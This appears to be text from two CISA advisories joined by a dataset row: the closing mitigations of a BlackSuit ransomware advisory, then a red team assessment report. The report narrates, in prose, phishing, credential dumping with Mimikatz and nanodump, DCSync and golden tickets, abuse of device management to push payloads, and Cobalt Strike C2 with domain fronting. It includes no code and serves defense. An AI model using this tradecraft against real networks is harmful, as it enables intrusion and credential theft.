See Table 18 through Table 23 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations. For additional mitigations, see the Mitigations section.












Detection Methods






(New August 7, 2024) Please reference YARA rule below to aid in detecting BlackSuit activity. Note: The YARA rule is derived from FBI investigations and is not guaranteed to detect confirmed malicious activity.

Mitigations
Network Defenders
The FBI and CISA recommend network defenders implement the mitigations below to improve your organization’s cybersecurity posture based on BlackSuit actor’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Implement a recovery planto maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;
Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts;
Disable password “hints;”
Refrain from requiring password changes more frequently than once per year. 
Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher. 
Require administrator credentials to install software.


Keep all operating systems, software, and firmware up to date,CPG 1.E,. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems.
Require Phishing-Resistant multifactor authentication to administrator accounts,CPG 2.H, and require standard MFA for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems. 
Segment networks,CPG 2.F, to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. 
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool,CPG 3.A,. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host. 
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Implement Secure Logging Collection and Storage Practices,CPG 2.T,. Learn more on logging best practices by referencing CISA’s Logging Made Easy resources.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege.
Disable unused ports.
Implement and Enforce Email Security Policies,CPG 2.M,.
Disable Macros by Default,CPG 2.N,.
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task. 
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally. 
Maintain offline backups of data, and regularly maintain backup and restoration,CPG 2.R,. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data. 
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.

Software Manufacturers
The above mitigations apply to enterprises and critical infrastructure organizations with on-premises or hybrid environments. Recognizing that insecure software is the root cause of the majority of these flaws and that the responsibility should not be on the end user, CISA urges software manufacturers to implement the following to reduce the prevalence of <identified or exploited issues (e.g., misconfigurations, weak passwords, and other weaknesses identified and exploited through the assessment team)>:

Embed security into product architecture throughout the entire software development lifecycle (SDLC).
Mandate MFA, ideally phishing-resistant MFA, for privileged users and make MFA a default, rather than opt-in, feature.

These mitigations align with tactics provided in the joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software. CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing security software and logs, monitoring, and making routine updates.
For more information on secure by design, see CISA’s Secure by Design webpage.
Validate Security Controls
In addition to applying mitigations, the FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI and CISA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 18 – Table 23).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
Resources

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.Note: The joint Ransomware Guide provides preparation, prevention, and mitigation best practices as well as a ransomware response checklist.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

Reporting
Your organization has no obligation to respond or provide information back to the FBI in response to this joint CSA. If, after reviewing the information provided, your organization decides to provide information to the FBI, reporting must be consistent with applicable state and federal laws.
The FBI is interested in any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with BlackSuit actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
Additional details of interest include: a targeted company point of contact, status, and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.
The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI’s Internet Crime Complain Center (IC3), a local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center (SayCISA@cisa.dhs.gov or by calling 1-844-Say-CISA (1-844-729-2472).
Disclaimer
Your organization has no obligation to respond or provide information in response to this product. If, after reviewing the information provided, your organization decides to provide information to the authoring agencies, it must do so consistent with applicable state and federal law.
The information in this report is being provided “as is” for informational purposes only. FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI and CISA.
Acknowledgements
The DFIR Report contributed to this advisory.
Version History
January 31, 2023: Initial Release (Royal Ransomware)November 13, 2023: First Update (Royal Ransomware)August 7, 2024: Updated title from “Royal Ransomware” to “BlackSuit Ransomware”; updates noted throughout.August 14, 2024: Updated STIX filesAugust 19, 2024: Updated STIX filesAugust 27, 2024: Updated STIX files






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a
33,"






Actions to take today to harden your local environment:




Establish a security baseline of normal network activity; tune network and host-based appliances to detect anomalous behavior.
Conduct regular assessments to ensure appropriate procedures are created and can be followed by security staff and end users.
Enforce phishing-resistant MFA to the greatest extent possible.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this Cybersecurity Advisory (CSA) detailing activity and key findings from a recent CISA red team assessment—in coordination with the assessed organization—to provide network defenders recommendations for improving their organization's cyber posture.
In 2022, CISA conducted a red team assessment (RTA) at the request of a large critical infrastructure organization with multiple geographically separated sites. The team gained persistent access to the organization’s network, moved laterally across the organization’s multiple geographically separated sites, and eventually gained access to systems adjacent to the organization’s sensitive business systems (SBSs). Multifactor authentication (MFA) prompts prevented the team from achieving access to one SBS, and the team was unable to complete its viable plan to compromise a second SBSs within the assessment period.
Despite having a mature cyber posture, the organization did not detect the red team’s activity throughout the assessment, including when the team attempted to trigger a security response.
CISA is releasing this CSA detailing the red team’s tactics, techniques, and procedures (TTPs) and key findings to provide network defenders of critical infrastructure organizations proactive steps to reduce the threat of similar activity from malicious cyber actors. This CSA highlights the importance of collecting and monitoring logs for unusual activity as well as continuous testing and exercises to ensure your organization’s environment is not vulnerable to compromise, regardless of the maturity of its cyber posture.
CISA encourages critical infrastructure organizations to apply the recommendations in the Mitigations section of this CSA—including conduct regular testing within their security operations center—to ensure security processes and procedures are up to date, effective, and enable timely detection and mitigation of malicious activity.
Download the PDF version of this report:


CISA Red Team Shares Key Findings to Improve Monitoring and Hardening of Networks
(PDF,       1.06 MB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. See the appendix for a table of the red team’s activity mapped to MITRE ATT&CK tactics and techniques.
Introduction
CISA has authority to, upon request, provide analyses, expertise, and other technical assistance to critical infrastructure owners and operators and provide operational and timely technical assistance to Federal and non-Federal entities with respect to cybersecurity risks. (See generally 6 U.S.C. §§ 652[c][5], 659[c][6].) After receiving a request for a red team assessment (RTA) from an organization and coordinating some high-level details of the engagement with certain personnel at the organization, CISA conducted the RTA over a three-month period in 2022.
During RTAs, a CISA red team emulates cyber threat actors to assess an organization’s cyber detection and response capabilities. During Phase I, the red team attempts to gain and maintain persistent access to an organization’s enterprise network while avoiding detection and evading defenses. During Phase II, the red team attempts to trigger a security response from the organization’s people, processes, or technology.
The “victim” for this assessment was a large organization with multiple geographically separated sites throughout the United States. For this assessment, the red team’s goal during Phase I was to gain access to certain sensitive business systems (SBSs).
Phase I: Red Team Cyber Threat Activity
Overview
The organization’s network was segmented with both logical and geographical boundaries. CISA’s red team gained initial access to two organization workstations at separate sites via spearphishing emails. After gaining access and leveraging Active Directory (AD) data, the team gained persistent access to a third host via spearphishing emails. From that host, the team moved laterally to a misconfigured server, from which they compromised the domain controller (DC). They then used forged credentials to move to multiple hosts across different sites in the environment and eventually gained root access to all workstations connected to the organization’s mobile device management (MDM) server. The team used this root access to move laterally to SBS-connected workstations. However, a multifactor authentication (MFA) prompt prevented the team from achieving access to one SBS, and Phase I ended before the team could implement a seemingly viable plan to achieve access to a second SBS.
Initial Access and Active Directory Discovery
The CISA red team gained initial access [TA0001] to two workstations at geographically separated sites (Site 1 and Site 2) via spearphishing emails. The team first conducted open-source research [TA0043] to identify potential targets for spearphishing. Specifically, the team looked for email addresses [T1589.002] as well as names [T1589.003] that could be used to derive email addresses based on the team’s identification of the email naming scheme. The red team sent tailored spearphishing emails to seven targets using commercially available email platforms [T1585.002]. The team used the logging and tracking features of one of the platforms to analyze the organization’s email filtering defenses and confirm the emails had reached the target’s inbox.
The team built a rapport with some targeted individuals through emails, eventually leading these individuals to accept a virtual meeting invite. The meeting invite took them to a red team-controlled domain [T1566.002] with a button, which, when clicked, downloaded a “malicious” ISO file [T1204]. After the download, another button appeared, which, when clicked, executed the file.
Two of the seven targets responded to the phishing attempt, giving the red team access to a workstation at Site 1 (Workstation 1) and a workstation at Site 2. On Workstation 1, the team leveraged a modified SharpHound collector, ldapsearch, and command-line tool, dsquery, to query and scrape AD information, including AD users [T1087.002], computers [T1018], groups [T1069.002], access control lists (ACLs), organizational units (OU), and group policy objects (GPOs) [T1615]. Note: SharpHound is a BloodHound collector, an open-source AD reconnaissance tool. Bloodhound has multiple collectors that assist with information querying.
There were 52 hosts in the AD that had Unconstrained Delegation enabled and a lastlogon timestamp within 30 days of the query. Hosts with Unconstrained Delegation enabled store Kerberos ticket-granting tickets (TGTs) of all users that have authenticated to that host. Many of these hosts, including a Site 1 SharePoint server, were Windows Server 2012R2. The default configuration of Windows Server 2012R2 allows unprivileged users to query group membership of local administrator groups.
The red team queried parsed Bloodhound data for members of the SharePoint admin group and identified several standard user accounts with administrative access. The team initiated a second spearphishing campaign, similar to the first, to target these users. One user triggered the red team’s payload, which led to installation of a persistent beacon on the user’s workstation (Workstation 2), giving the team persistent access to Workstation 2.
Lateral Movement, Credential Access, and Persistence
The red team moved laterally [TA0008] from Workstation 2 to the Site 1 SharePoint server and had SYSTEM level access to the Site 1 SharePoint server, which had Unconstrained Delegation enabled. They used this access to obtain the cached credentials of all logged-in users—including the New Technology Local Area Network Manager (NTLM) hash for the SharePoint server account. To obtain the credentials, the team took a snapshot of lsass.exe [T1003.001] with a tool called nanodump, exported the output, and processed the output offline with Mimikatz.
The team then exploited the Unconstrained Delegation misconfiguration to steal the DC’s TGT. They ran the DFSCoerce python script (DFSCoerce.py), which prompted DC authentication to the SharePoint server using the server’s NTLM hash. The team then deployed Rubeus to capture the incoming DC TGT [T1550.002], [T1557.001]. (DFSCoerce abuses Microsoft's Distributed File System [MS-DFSNM] protocol to relay authentication against an arbitrary server.[1])
The team then used the TGT to harvest advanced encryption standard (AES)-256 hashes via DCSync [T1003.006] for the krbtgt account and several privileged accounts—including domain admins, workstation admins, and a system center configuration management (SCCM) service account (SCCM Account 1). The team used the krbtgt account hash throughout the rest of their assessment to perform golden ticket attacks [T1558.001] in which they forged legitimate TGTs. The team also used the asktgt command to impersonate accounts they had credentials for by requesting account TGTs [T1550.003].
The team first impersonated the SCCM Account 1 and moved laterally to a Site 1 SCCM distribution point (DP) server (SCCM Server 1) that had direct network access to Workstation 2. The team then moved from SCCM Server 1 to a central SCCM server (SCCM Server 2) at a third site (Site 3). Specifically, the team:

Queried the AD using Lightweight Directory Access Protocol (LDAP) for information about the network's sites and subnets [T1016]. This query revealed all organization sites and subnets broken down by classless inter-domain routing (CIDR) subnet and description.
Used LDAP queries and domain name system (DNS) requests to identify recently active hosts.
Listed existing network connections [T1049] on SCCM Server 1, which revealed an active Server Message Block (SMB) connection from SCCM Server 2.
Attempted to move laterally to the SCCM Server 2 via AppDomain hijacking, but the HTTPS beacon failed to call back.
Attempted to move laterally with an SMB beacon [T1021.002], which was successful.

The team also moved from SCCM Server 1 to a Site 1 workstation (Workstation 3) that housed an active server administrator. The team impersonated an administrative service account via a golden ticket attack (from SCCM Server 1); the account had administrative privileges on Workstation 3. The user employed a KeePass password manager that the team was able to use to obtain passwords for other internal websites, a kernel-based virtual machine (KVM) server, virtual private network (VPN) endpoints, firewalls, and another KeePass database with credentials. The server administrator relied on a password manager, which stored credentials in a database file. The red team pulled the decryption key from memory using KeeThief and used it to unlock the database [T1555.005].
At the organization’s request, the red team confirmed that SCCM Server 2 provided access to the organization’s sites because firewall rules allowed SMB traffic to SCCM servers at all other sites.
The team moved laterally from SCCM Server 2 to an SCCM DP server at Site 5 and from the SCCM Server 1 to hosts at two other sites (Sites 4 and 6). The team installed persistent beacons at each of these sites. Site 5 was broken into a private and a public subnet and only DCs were able to cross that boundary. To move between the subnets, the team moved through DCs. Specifically, the team moved from the Site 5 SCCM DP server to a public DC; and then they moved from the public DC to the private DC. The team was then able to move from the private DC to workstations in the private subnet.
The team leveraged access available from SCCM 2 to move around the organization’s network for post-exploitation activities (See Post-Exploitation Activity section).
See Figure 1 for a timeline of the red team’s initial access and lateral movement showing key access points.

 

Figure 1: Red Team Cyber Threat Activity: Initial Access and Lateral Movement

While traversing the network, the team varied their lateral movement techniques to evade detection and because the organization had non-uniform firewalls between the sites and within the sites (within the sites, firewalls were configured by subnet). The team’s primary methods to move between sites were AppDomainManager hijacking and dynamic-link library (DLL) hijacking [T1574.001]. In some instances, they used Windows Management Instrumentation (WMI) Event Subscriptions [T1546.003].
The team impersonated several accounts to evade detection while moving. When possible, the team remotely enumerated the local administrators group on target hosts to find a valid user account. This technique relies on anonymous SMB pipe binds [T1071], which are disabled by default starting with Windows Server 2016. In other cases, the team attempted to determine valid accounts based on group name and purpose. If the team had previously acquired the credentials, they used asktgt to impersonate the account. If the team did not have the credentials, they used the golden ticket attack to forge the account.
Post-Exploitation Activity: Gaining Access to SBSs
With persistent, deep access established across the organization’s networks and subnetworks, the red team began post-exploitation activities and attempted to access SBSs. Trusted agents of the organization tasked the team with gaining access to two specialized servers (SBS 1 and SBS 2). The team achieved root access to three SBS-adjacent workstations but was unable to move laterally to the SBS servers:

Phase I ended before the team could implement a plan to move to SBS 1.
An MFA prompt blocked the team from moving to SBS 2, and Phase I ended before they could implement potential workarounds.

However, the team assesses that by using Secure Shell (SSH) session socket files (see below), they could have accessed any hosts available to the users whose workstations were compromised.
Plan for Potential Access to SBS 1
Conducting open-source research [1591.001], the team identified that SBS 1 and 2 assets and associated management/upkeep staff were located at Sites 5 and 6, respectively. Adding previously collected AD data to this discovery, the team was able to identify a specific SBS 1 admin account. The team planned to use the organization’s mobile device management (MDM) software to move laterally to the SBS 1 administrator’s workstation and, from there, pivot to SBS 1 assets.
The team identified the organization’s MDM vendor using open-source and AD information [T1590.006] and moved laterally to an MDM distribution point server at Site 5 (MDM DP 1). This server contained backups of the MDM MySQL database on its D: drive in the Backup directory. The backups included the encryption key needed to decrypt any encrypted values, such as SSH passwords [T1552]. The database backup identified both the user of the SBS 1 administrator account (USER 2) and the user’s workstation (Workstation 4), which the MDM software remotely administered.
The team moved laterally to an MDM server (MDM 1) at Site 3, searched files on the server, and found plaintext credentials [T1552.001] to an application programming interface (API) user account stored in PowerShell scripts. The team attempted to leverage these credentials to browse to the web login page of the MDM vendor but were unable to do so because the website directed to an organization-controlled single-sign on (SSO) authentication page.
The team gained root access to workstations connected to MDM 1—specifically, the team accessed Workstation 4—by:

Selecting an MDM user from the plaintext credentials in PowerShell scripts on MDM 1.
While in the MDM MySQL database,

Elevating the selected MDM user’s account privileges to administrator privileges, and
Modifying the user’s account by adding Create Policy and Delete Policy permissions [T1098], [T1548].


Creating a policy via the MDM API [T1106], which instructed Workstation 4 to download and execute a payload to give the team interactive access as root to the workstation.
Verifying their interactive access.
Resetting permissions back to their original state by removing the policy via the MDM API and removing Create Policy and Delete Policy and administrator permissions and from the MDM user’s account.

While interacting with Workstation 4, the team found an open SSH socket file and a corresponding netstat connection to a host that the team identified as a bastion host from architecture documentation found on Workstation 4. The team planned to move from Workstation 4 to the bastion host to SBS 1. Note: A SSH socket file allows a user to open multiple SSH sessions through a single, already authenticated SSH connection without additional authentication.
The team could not take advantage of the open SSH socket. Instead, they searched through SBS 1 architecture diagrams and documentation on Workstation 4. They found a security operations (SecOps) network diagram detailing the network boundaries between Site 5 SecOps on-premises systems, Site 5 non-SecOps on-premises systems, and Site 5 SecOps cloud infrastructure. The documentation listed the SecOps cloud infrastructure IP ranges [T1580]. These “trusted” IP addresses were a public /16 subnet; the team was able to request a public IP in that range from the same cloud provider, and Workstation 4 made successful outbound SSH connections to this cloud infrastructure. The team intended to use that connection to reverse tunnel traffic back to the workstation and then access the bastion host via the open SSH socket file. However, Phase 1 ended before they were able to implement this plan.
Attempts to Access SBS 2
Conducting open-source research, the team identified an organizational branch [T1591] that likely had access to SBS 2. The team queried the AD to identify the branch’s users and administrators. The team gathered a list of potential accounts, from which they identified administrators, such as SYSTEMS ADMIN or DATA SYSTEMS ADMINISTRATOR, with technical roles. Using their access to the MDM MySQL database, the team queried potential targets to (1) determine the target’s last contact time with the MDM and (2) ensure any policy targeting the target’s workstation would run relatively quickly [T1596.005]. Using the same methodology as described by the steps in the Plan for Potential Access to SBS 1 section above, the team gained interactive root access to two Site 6 SBS 2-connected workstations: a software engineering workstation (Workstation 5) and a user administrator workstation (Workstation 6).
The Workstation 5 user had bash history files with what appeared to be SSH passwords mistyped into the bash prompt and saved in bash history [T1552.003]. The team then attempted to authenticate to SBS 2 using a similar tunnel setup as described in the Access to SBS 1 section above and the potential credentials from the user’s bash history file. However, this attempt was unsuccessful for unknown reasons.
On Workstation 6, the team found a .txt file containing plaintext credentials for the user. Using the pattern discovered in these credentials, the team was able to crack the user’s workstation account password [T1110.002]. The team also discovered potential passwords and SSH connection commands in the user’s bash history. Using a similar tunnel setup described above, the team attempted to log into SBS 2. However, a prompt for an MFA passcode blocked this attempt.
See figure 2 for a timeline of the team’s post exploitation activity that includes key points of access.

 

Figure 2: Red Team Cyber Threat Activity: Post Exploitation

Command and Control
The team used third-party owned and operated infrastructure and services [T1583] throughout their assessment, including in certain cases for command and control (C2) [TA0011]. These included:

Cobalt Strike and Merlin payloads for C2 throughout the assessment. Note: Merlin is a post-exploit tool that leverages HTTP protocols for C2 traffic.

The team maintained multiple Cobalt Strike servers hosted by a cloud vendor. They configured each server with a different domain and used the servers for communication with compromised hosts. These servers retained all assessment data.


Two commercially available cloud-computing platforms.

The team used these platforms to create flexible and dynamic redirect servers to send traffic to the team’s Cobalt Strike servers [T1090.002]. Redirecting servers make it difficult for defenders to attribute assessment activities to the backend team servers. The redirectors used HTTPS reverse proxies to redirect C2 traffic between the target organization’s network and the Cobalt Strike team servers [T1071.002]. The team encrypted all data in transit [T1573] using encryption keys stored on team’s Cobalt Strike servers.


A cloud service to rapidly change the IP address of the team’s redirecting servers in the event of detection and eradication.
Content delivery network (CDN) services to further obfuscate some of the team’s C2 traffic.

This technique leverages CDNs associated with high-reputation domains so that the malicious traffic appears to be directed towards a reputation domain but is actually redirected to the red team-controlled Cobalt Strike servers.
The team used domain fronting [T1090.004] to disguise outbound traffic in order to diversify the domains with which the persistent beacons were communicating. This technique, which also leverages CDNs, allows the beacon to appear to connect to third-party domains, such as nytimes.com, when it is actually connecting to the team’s redirect server.



Phase II: Red Team Measurable Events Activity
The red team executed 13 measurable events designed to provoke a response from the people, processes, and technology defending the organization’s network. See Table 1 for a description of the events, the expected network defender activity, and the organization’s actual response.

Table 1: Measurable Events


Measurable Event
Description
MITRE ATT&CK Technique(s)
Expected Detection Points
Expected Network Defender Reactions
Reported Reactions




Internal Port Scan
Launch scan from inside the network from a previously gained workstation to enumerate ports on target workstation, server, and domain controller system(s).


Network Service Discovery [T1046]




Network Monitoring and Analysis Tools
Intrusion Detection or Prevention Systems
Endpoint Protection Platform




Detect target hosts and ports
Identify associated scanning process
Analyze scanning host once detected
Develop response plan


None



 
Comprehensive Active Directory and Host Enumeration

Perform AD enumeration by querying all domain objects from the DC; and enumerating trust relationships within the AD Forest, user accounts, and current session information from every domain computer (Workstation and Server).


Domain Trust Discovery [T1482]
Account Discovery: Domain Account [T1087.002]
System Owner/User Discovery [T1033]
Remote System Discovery [T1018]




Network Monitoring and Analysis Tools
Intrusion Detection or Prevention Systems
Endpoint Protection Platform




Detect target hosts and ports
Identify associated scanning process
Analyze scanning host once detected
Develop response plan


Collection process stopped before completion. Host isolated and sent for forensics.


Data Exfiltration—1 GB of Data
Send a large amount (1 GB) of mock sensitive information to an external system over various protocols, including ICMP, DNS, FTP, and/or HTTP/S.


Exfiltration Over Alternative Protocol [T1048]




Network Monitoring and Analysis Tools
Intrusion Detection or Prevention Systems
Endpoint Protection Platform




Detect target hosts and ports
Identify associated scanning process
Analyze scanning host once detected
Develop response plan


None


Malicious Traffic Generation—Workstation to External Host
Establish a session that originates from a target Workstation system directly to an external host over a clear text protocol, such as HTTP.


Application Layer Protocol [T1071]




Intrusion Detection or Prevention Systems
Endpoint Protection Platform
Windows Event Logs




Detect and Identify source IP and source process of enumeration
Analyze scanning host once detected
Develop response plan


None


Active Directory Account Lockout
Lock out several administrative AD accounts


Account Access Removal [T1531]

 



Windows Event Logs
End User Reporting




Detect and Identify source IP and source process of exfiltration
Analyze host used for exfiltration once detected

Develop response plan

None


Local Admin User Account Creation (workstation)
Create a local administrator account on a target workstation system.


Create Account: Local Account [T1136.001]
Account Manipulation [T1098]




Intrusion Detection or Prevention Systems
Endpoint Protection Platform
Web Proxy Logs




Detect and identify source IP and source process of malicious traffic
Investigate destination IP address
Triage compromised host
Develop response plan


None


Local Admin User Account Creation (server)
Create a local administrator account on a target server system.


Create Account: Local Account [T1136.001]
Account Manipulation [T1098]




Windows Event Logs




Detect account creation
Identify source of change
Verify change with system owner
Develop response plan


None


Active Directory Account Creation
Create AD accounts and add it to domain admins group


Create Account: Domain Account [T1136.002]
Account Manipulation [T1098]




Windows Event Logs




Detect account creation
Identify source of change
Verify change with system owner
Develop response plan


None


Workstation Admin Lateral Movement—Workstation to Workstation

Use a previously compromised workstation admin account to upload and execute a payload via SMB and Windows Service Creation, respectively, on several target Workstations.
 



Valid Accounts: Domain Accounts [T1078.002]
Remote Services: SMB/Windows Admin Shares, Sub-technique [T1021.002]
Create or Modify System Process: Windows Service [T1543.003]




Windows Event Logs




Detect account compromise
Analyze compromised host
Develop response plan


None


Domain Admin Lateral Movement—Workstation to Domain Controller
Use a previously compromised domain admin account to upload and execute a payload via SMB and Windows Service Creation, respectively, on a target DC.


Valid Accounts: Domain Accounts [T1078.002]
Remote Services: SMB/Windows Admin Shares, Sub-technique [T1021.002]
Create or Modify System Process: Windows Service [T1543.003]




Windows Event Logs




Detect account compromise
Triage compromised host
Develop response plan


None


Malicious Traffic Generation—Domain Controller to External Host
Establish a session that originates from a target Domain Controller system directly to an external host over a clear text protocol, such as HTTP.


Application Layer Protocol [T1071]




Intrusion Detection or Prevention Systems
Endpoint Protection Platform
Web Proxy Logs




Detect and identify source IP and source process of malicious traffic
Investigate destination IP address
Triage compromised host

Develop response plan

None


Trigger Host-Based Protection—Domain Controller
Upload and execute a well-known (e.g., with a signature) malicious file to a target DC system to generate host-based alerts.


Ingress Tool Transfer [T1105]




Endpoint Protection Platform
Endpoint Detection and Response




Detect and identify source IP and source process of malicious traffic
Investigate destination IP address
Triage compromised host
Develop response plan


Malicious file was removed by antivirus


Ransomware Simulation

Execute simulated ransomware on multiple Workstation systems to simulate a ransomware attack.
Note: This technique does NOT encrypt files on the target system.

N/A


End User Reporting




Investigate end user reported event
Triage compromised host
Develop response Plan


Four users reported event to defensive staff



Findings
Key Issues
The red team noted the following key issues relevant to the security of the organization’s network. These findings contributed to the team’s ability to gain persistent, undetected access across the organization’s sites. See the Mitigations section for recommendations on how to mitigate these issues.

Insufficient host and network monitoring. Most of the red team’s Phase II actions failed to provoke a response from the people, processes, and technology defending the organization’s network. The organization failed to detect lateral movement, persistence, and C2 activity via their intrusion detection or prevention systems, endpoint protection platform, web proxy logs, and Windows event logs. Additionally, throughout Phase I, the team received no deconflictions or confirmation that the organization caught their activity. Below is a list of some of the higher risk activities conducted by the team that were opportunities for detection:

Phishing
Lateral movement reuse
Generation and use of the golden ticket
Anomalous LDAP traffic
Anomalous internal share enumeration
Unconstrained Delegation server compromise
DCSync
Anomalous account usage during lateral movement
Anomalous outbound network traffic
Anomalous outbound SSH connections to the team’s cloud servers from workstations


Lack of monitoring on endpoint management systems. The team used the organization’s MDM system to gain root access to machines across the organization’s network without being detected. Endpoint management systems provide elevated access to thousands of hosts and should be treated as high value assets (HVAs) with additional restrictions and monitoring.
KRBTGT never changed. The Site 1 krbtgt account password had not been updated for over a decade. The krbtgt account is a domain default account that acts as a service account for the key distribution center (KDC) service used to encrypt and sign all Kerberos tickets for the domain. Compromise of the krbtgt account could provide adversaries with the ability to sign their own TGTs, facilitating domain access years after the date of compromise. The red team was able to use the krbtgt account to forge TGTs for multiple accounts throughout Phase I.
Excessive permissions to standard users. The team discovered several standard user accounts that have local administrator access to critical servers. This misconfiguration allowed the team to use the low-level access of a phished user to move laterally to an Unconstrained Delegation host and compromise the entire domain.
Hosts with Unconstrained Delegation enabled unnecessarily. Hosts with Unconstrained Delegation enabled store the Kerberos TGTs of all users that authenticate to that host, enabling actors to steal service tickets or compromise krbtgt accounts and perform golden ticket or  “silver ticket” attacks. The team performed an NTLM-relay attack to obtain the DC’s TGT, followed by a golden ticket attack on a SharePoint server with Unconstrained Delegation to gain the ability to impersonate any Site 1 AD account.
Use of non-secure default configurations. The organization used default configurations for hosts with Windows Server 2012 R2. The default configuration allows unprivileged users to query group membership of local administrator groups. The red team used and identified several standard user accounts with administrative access from a Windows Server 2012 R2 SharePoint server.

Additional Issues
The team noted the following additional issues.

Ineffective separation of privileged accounts. Some workstations allowed unprivileged accounts to have local administrator access; for example, the red team discovered an ordinary user account in the local admin group for the SharePoint server. If a user with administrative access is compromised, an actor can access servers without needing to elevate privileges. Administrative and user accounts should be separated, and designated admin accounts should be exclusively used for admin purposes.
Lack of server egress control. Most servers, including domain controllers, allowed unrestricted egress traffic to the internet.
Inconsistent host configuration. The team observed inconsistencies on servers and workstations within the domain, including inconsistent membership in the local administrator group among different servers or workstations. For example, some workstations had “Server Admins” or “Domain Admins” as local administrators, and other workstations had neither.
Potentially unwanted programs. The team noticed potentially unusual software, including music software, installed on both workstations and servers. These extraneous software installations indicate inconsistent host configuration (see above) and increase the attack surfaces for malicious actors to gain initial access or escalate privileges once in the network.
Mandatory password changes enabled. During the assessment, the team keylogged a user during a mandatory password change and noticed that only the final character of their password was modified. This is potentially due to domain passwords being required to be changed every 60 days.
Smart card use was inconsistent across the domain. While the technology was deployed, it was not applied uniformly, and there was a significant portion of users without smartcard protections enabled. The team used these unprotected accounts throughout their assessment to move laterally through the domain and gain persistence.

Noted Strengths
The red team noted the following technical controls or defensive measures that prevented or hampered offensive actions:

The organization conducts regular, proactive penetration tests and adversarial assessments and invests in hardening their network based on findings.

The team was unable to discover any easily exploitable services, ports, or web interfaces from more than three million external in-scope IPs. This forced the team to resort to phishing to gain initial access to the environment.
Service account passwords were strong. The team was unable to crack any of the hashes obtained from the 610 service accounts pulled. This is a critical strength because it slowed the team from moving around the network in the initial parts of the Phase I.
The team did not discover any useful credentials on open file shares or file servers. This slowed the progress of the team from moving around the network.


MFA was used for some SBSs. The team was blocked from moving to SBS 2 by an MFA prompt.
There were strong security controls and segmentation for SBS systems. Direct access to SBS were located in separate networks, and admins of SBS used workstations protected by local firewalls.

